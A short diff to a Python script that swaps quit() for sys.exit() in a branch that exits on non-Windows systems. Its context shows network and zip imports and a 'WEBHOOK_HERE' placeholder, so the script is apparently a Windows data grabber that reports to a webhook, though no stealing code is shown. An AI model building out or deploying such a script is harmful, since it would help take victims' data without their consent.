@@ -4,6 +4,7 @@ import random
 import platform
 import requests
 import platform
+import sys
 from urllib.request import Request, urlopen
 from json import dumps
 from zipfile import ZipFile
@@ -14,7 +15,7 @@ if platform.system() == "Windows":
     pass
 else:
     # If not running on Windows, exit the program
-    quit()
+    sys.exit()
 
 
 hook = "WEBHOOK_HERE"
